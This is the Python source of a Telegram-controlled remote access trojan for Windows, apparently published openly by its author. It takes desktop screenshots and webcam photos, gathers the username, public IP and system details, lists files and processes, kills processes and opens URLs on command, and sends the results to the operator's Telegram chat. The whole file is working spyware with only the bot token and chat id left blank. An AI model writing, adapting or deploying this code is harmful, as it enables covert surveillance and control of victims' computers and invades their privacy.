import requests 
import platform
import telebot
import os
import webbrowser
import json
import cv2
import requests as r
import subprocess
from PIL import ImageGrab
from telebot import util
from telebot import types
from subprocess import Popen, PIPE

token = ''
id_chat = ''


bot = telebot.TeleBot(token, threaded=True)
bot.worker_pool = util.ThreadPool(num_threads=50)


@bot.message_handler(commands=['start', 'Start'])
def start(commands):
	bot.send_message(id_chat, '😳 Hy! froggy frog! 🐰 ' +   
		'\n\nlets have fun  , if you want a command write /help' +
		'\n\nCoded by Yezz123() | The quieter you become, the more you are able to hear')


@bot.message_handler(commands=['help', 'Help'])
def help(command):
	bot.send_message(id_chat, 'Commands: \n /Screen🖼 - Desktop ScreenShot \n /Info - Information about computer \n /Open_url🌐 - Open WebSite' +
		'\n /ls📄 - List dir \n /Kill_process📝 + name process \n /Webcam📸 - Webcam + \n /Tasklist📋 - Process List')


@bot.message_handler(commands=['info', 'Info'])
def info_send(command):
	try:
		username = os.getlogin()

		r = requests.get('http://ip.42.pl/raw')
		ip = r.text
		windows = platform.platform()
		processor = platform.processor()

		bot.send_message(id_chat, 'PC: ' + username + '\nIP: ' + ip + '\nOS: ' + windows + '\nProcessor: ' + processor)
	except:
		bot.send_message(id_chat, 'Error')


@bot.message_handler(commands=['screen', 'Screen'])
def send_screen(command):
	try:
		screen = ImageGrab.grab()
		screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')
		screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
		files = {'photo': screen}
		bot.send_photo(id_chat, screen)
	except:
		bot.send_photo(id_chat, 'Error')


@bot.message_handler(commands=['open_url'])
def open_url(message):
	user_msg = '{0}'.format(message.text)
	url = user_msg.split(' ')[1]
	try:
		webbrowser.open_new_tab(url)
	except:
		bot.send_message(id_chat, 'Error blyt')


@bot.message_handler(commands=['pwd', 'Pwd'])
def pwd(command):
	dir = os.path.abspath(os.getcwd())
	bot.send_message(id_chat, 'Pwd: \n' + (str(dir)))


@bot.message_handler(commands=['ls', 'Ls'])
def ls_dir(command):
	try:
		dirs = '\n'.join(os.listdir(path='.'))
		bot.send_message(id_chat, 'Files: ' + '\n' + dirs)
	except:
		bot.send_message(id_chat, 'Bla')


@bot.message_handler(commands=['kill_process', 'Kill_process'])
def kill_process(message):
	try:
		user_msg = '{0}'.format(message.text)
		subprocess.call('taskkill /IM ' + user_msg.split(' ')[1])
		bot.send_message(id_chat, 'Good!')
	except:
		bot.send_message(id_chat, 'Pizda!')


@bot.message_handler(commands=['webcam', 'Webcam'])
def webcam(command):
	try:
		cap = cv2.VideoCapture(0)
		for i in range(30):
			cap.read()

		ret, frame = cap.read()
		cv2.imwrite(os.environ['ProgramData'] + '\\WebCam.jpg', frame)

		bot.send_chat_action(id_chat, 'upload_photo')
		cap.release()

		webcam = open(os.environ['ProgramData'] + '\\WebCam.jpg', 'rb')
		bot.send_photo(id_chat, webcam)
		webcam.close()
		
	except:
		bot.send_chat_action(id_chat, 'typing')
		bot.send_message(id_chat, '*Webcam not found*', parse_mode="Markdown")

		
@bot.message_handler(commands=['tasklist', 'Tasklist'])
def tasklist(command):
	try:
		bot.send_chat_action(id_chat, 'typing')

		prs = Popen('tasklist', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
		pr_list = [prs[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(prs))]

		pr_string = '\n'.join(pr_list)
		bot.send_message(command.chat.id, '`' + pr_string + '`', parse_mode="Markdown")

	except:
		bot.send_message(id_chat, '*Not Found*', parse_mode="Markdown")


bot.polling()
